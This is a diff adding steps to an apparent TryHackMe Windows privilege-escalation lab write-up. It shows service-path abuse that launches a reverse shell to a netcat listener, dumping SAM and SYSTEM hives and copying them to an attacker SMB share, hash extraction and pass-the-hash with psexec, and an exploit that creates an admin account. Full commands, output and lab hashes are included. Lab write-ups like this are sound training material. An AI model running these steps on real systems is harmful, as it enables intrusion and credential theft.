@@ -612,19 +612,19 @@ processed file: C:\Users\thm-unpriv\ReverseShell.exe
 Successfully processed 1 files; Failed processing 0 files
 ```
 
-7. `sc config <SERVICE> binPath= "<BINARY PATH>" obj= <SERVICE ACCOUNT>` from the compromised Windows machine 
+7. `sc config <SERVICE> binPath= "<BINARY PATH>" obj= <SERVICE ACCOUNT>` from the compromised Windows machine to configure the binary path to our payload and the service to run under the `LocalSystem` account for our target service
 ```PowerShell
 C:\Users\thm-unpriv>sc config THMService binPath= "C:\Users\thm-unpriv\ReverseShell.exe" obj= LocalSystem
 [SC] ChangeServiceConfig SUCCESS
 ```
 
-8. 
+8. `nc <PORT NUMBER>` from our attack machine to launch a netcat listener that'll listen for any inbound connection
 ```Bash
 root@ip-10-10-6-207:~# nc -lvnp 9999
 Listening on [0.0.0.0] (family 0, port 9999)
 ```
 
-9. 
+9. `sc stop <SERVICE>` from the compromised Windows machine to stop our target service
 ```PowerShell
 C:\Users\thm-unpriv>sc stop THMService
 [SC] ControlService FAILED 1062:
@@ -632,7 +632,7 @@ C:\Users\thm-unpriv>sc stop THMService
 The service has not been started.
 ```
 
-10. 
+10. `sc start <SERVICE>` from the compromised Windows machine to restart our target service, but this time it'll execute our payload and spawn in a reverse shell that'll connect back to our active netcat listener that's running on our attack machine
 ```PowerShell
 C:\Users\thm-unpriv>sc start THMService
 
@@ -656,7 +656,7 @@ Microsoft Windows [Version 10.0.17763.1821]
 C:\Windows\system32>
 ```
 
-11. 
+11. `type <FILENAME>` from our reverse shell to display the contents of the file containing this task's flag
 ```PowerShell
 C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt
 type C:\Users\Administrator\Desktop\flag.txt
@@ -664,10 +664,199 @@ THM{INSECURE_SVC_CONFIG}
 ```
 
 
+**TASK COMPLETED!**
+
 ## Abusing Dangerous Privileges
 
+1. Started this task's machine
+2. `whoami /priv` from the compromised Windows machine to display the security privileges held on the system by the user that we're currently authenticated as
+```PowerShell
+C:\Windows\system32>whoami /priv
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                    State
+============================= ============================== ========
+SeBackupPrivilege             Back up files and directories  Disabled
+SeRestorePrivilege            Restore files and directories  Disabled
+SeShutdownPrivilege           Shut down the system           Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+```
+
+3. `reg save <REGISTRY PATH> <DESTINATION FILE>` from the compromised Windows machine to export and save the specified registry hive, which in this case is `hklm\system`, from the Windows Registry to a file, which contains essential system-wide configuration settings and information on a Windows operating system
+```PowerShell
+C:\Windows\system32>reg save hklm\system C:\Users\THMBackup\system.hive
+The operation completed successfully.
+```
+
+4. `reg save <REGISTRY PATH> <DESTINATION FILE>` from the compromised Windows machine to export and save the specified registry hive, which in this case is `hklm\sam`, from the Windows Registry to a file, which contains the SAM (`Security Accounts Manager`) database, which is responsible for managing user account information, such as passwords, security policies, and other authentication-related data
+```PowerShell
+C:\Windows\system32>reg save hklm\sam C:\Users\THMBackup\sam.hive           
+The operation completed successfully.
+```
+
+5. `mkdir <DIRECTORY>` from our attack machine to create a directory that we'll make publicly accessible by setting up an SMB (Server Message Block) server
+```Bash
+root@ip-10-10-174-220:~# mkdir share
+```
+
+6. `python3.9 /opt/impacket/examples/smbserver.py -smb2support -username <USERNAME> -password <PASSWORD> public <DIRECTORY>` from our attack machine to set up a simple SMB (Server Message Block) server using the [Impacket Python library](https://pypi.org/project/impacket/) that'll provide a public share name "public" that we'll be able to access through the compromised Windows machine using the specified username and password 
+```Bash
+root@ip-10-10-174-220:~# python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+
+7. `copy <SAM BACKUP FILE> <SMB SHARE>` from the compromised Windows machine to copy our SAM backup file from the local machine to our SMB server that's running on our attack machine
+```PowerShell
+C:\Windows\system32>copy C:\Users\THMBackup\sam.hive \\10.10.174.220\public\                                                                                1 file(s) copied.
+```
+```Bash
+[*] Incoming connection (10.10.160.214,49770)
+[*] AUTHENTICATE_MESSAGE (WPRIVESC2\THMBackup,WPRIVESC2)
+[*] User WPRIVESC2\THMBackup authenticated successfully
+[*] THMBackup::WPRIVESC2:aaaaaaaaaaaaaaaa:18909ffd6a713ab97c95d0afdec779fe:010100000000000080db871c35c7d901da9b2ad82045ddfa00000000010010005500750068004a005500440065006100030010005500750068004a005500440065006100020010007900660056006800700073004d006c00040010007900660056006800700073004d006c000700080080db871c35c7d9010600040002000000080030003000000000000000000000000030000066375d7e28857eb587212f56dfdc68cc77fc1bad71a82ca14c5537d668b1a0930a001000000000000000000000000000000000000900240063006900660073002f00310030002e00310030002e003100370034002e003200320030000000000000000000
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:public)
+[*] Disconnecting Share(1:IPC$)
+[*] Disconnecting Share(2:public)
+[*] Closing down connection (10.10.160.214,49770)
+[*] Remaining connections []
+```
+
+8. `copy <SYSTEM BACKUP FILE> <SMB SHARE>` from the compromised Windows machine to copy our SYSTEM backup file from the local machine to our SMB server that's running on our attack machine
+```PowerShell
+C:\Windows\system32>copy C:\Users\THMBackup\system.hive \\10.10.174.220\public\                                                                                 1 file(s) copied.
+```
+```Bash
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:public)
+[*] Disconnecting Share(1:IPC$)
+[*] Disconnecting Share(2:public)
+[*] Closing down connection (10.10.160.214,49770)
+[*] Remaining connections []
+[*] Incoming connection (10.10.160.214,49777)
+[*] AUTHENTICATE_MESSAGE (WPRIVESC2\THMBackup,WPRIVESC2)
+[*] User WPRIVESC2\THMBackup authenticated successfully
+[*] THMBackup::WPRIVESC2:aaaaaaaaaaaaaaaa:49979ee56a3e931f05fbb73e33da8154:0101000000000000003f774435c7d901b5e29d5a6fcea66f00000000010010005500750068004a005500440065006100030010005500750068004a005500440065006100020010007900660056006800700073004d006c00040010007900660056006800700073004d006c0007000800003f774435c7d9010600040002000000080030003000000000000000000000000030000066375d7e28857eb587212f56dfdc68cc77fc1bad71a82ca14c5537d668b1a0930a001000000000000000000000000000000000000900240063006900660073002f00310030002e00310030002e003100370034002e003200320030000000000000000000
+[*] Connecting Share(1:public)
+[*] Disconnecting Share(1:public)
+[*] Closing down connection (10.10.160.214,49777)
+[*] Remaining connections []
+```
+
+9. `python3.9 /opt/impacket/examples/secretsdump.py -sam <SAM BACKUP FILE> -system <SYSTEM BACKUP FILE> LOCAL` from our attack machine to extract and dump the user account password hashes from the SAM and SYSTEM registry hives using the [Impacket Python Library](https://pypi.org/project/impacket/), which ended up revealing the compromised Windows machine's Administrator's password hash
+```Bash
+root@ip-10-10-174-220:~# python3.9 /opt/impacket/examples/secretsdump.py -sam ~/share/sam.hive -system ~/share/system.hive LOCAL
+Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
+
+[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
+THMBackup:1008:aad3b435b51404eeaad3b435b51404ee:6c252027fb2022f5051e854e08023537:::
+THMTakeOwnership:1009:aad3b435b51404eeaad3b435b51404ee:0af9b65477395b680b822e0b2c45b93b:::
+[*] Cleaning up...
+```
+
+10. `python3.9 /opt/impacket/examples/psexec.py -hashes <PASSWORD HASH> <USER>@<TARGET MACHINE>` from our attack machine to perform a PtH (`Pass-the-Hash` attack) to remotely connect back to the compromised Windows machine as their Administrator, which ended up working and giving us a shell
+```Bash
+root@ip-10-10-174-220:~# python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 Administrator@10.10.160.214
+Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
+
+[*] Requesting shares on 10.10.160.214.....
+[*] Found writable share ADMIN$
+[*] Uploading file KgzHWirv.exe
+[*] Opening SVCManager on 10.10.160.214.....
+[*] Creating service nEfC on 10.10.160.214.....
+[*] Starting service nEfC.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> 
+```
+
+11. `type <FILENAME` from the remote terminal to display the contents of the file that contains this task's flag onto our terminal
+```PowerShell
+C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.txt
+THM{SEFLAGPRIVILEGE}
+```
+
+
+**TASK COMPLETED!**
 
 ## Abusing Vulnerable Software
+
+1. Started this task's machine
+2. `notepad.exe` from the compromised Windows machine 
+```PowerShell
+C:\Users\thm-unpriv>notepad.exe
+```
+
+![]()
+
+![]()
+
+![]()
+
+```PowerShell
+C:\Users\thm-unpriv>PowerShell.exe C:\Users\thm-unpriv\Documents\Exploit.ps1
+22
+4
+4
+280
+```
+
+```PowerShell
+C:\Users\thm-unpriv>net user pwnd
+User name                    pwnd
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            8/4/2023 11:56:05 PM
+Password expires             9/15/2023 11:56:05 PM
+Password changeable          8/4/2023 11:56:05 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Users
+Global Group memberships     *None
+The command completed successfully.
+```
+
+![]()
+
+![]()
+
+![]()
+
+![]()
+
+```PowerShell
+C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt
+THM{EZ_DLL_PROXY_4ME}
+```
 
 
 ## Tools of the Trade
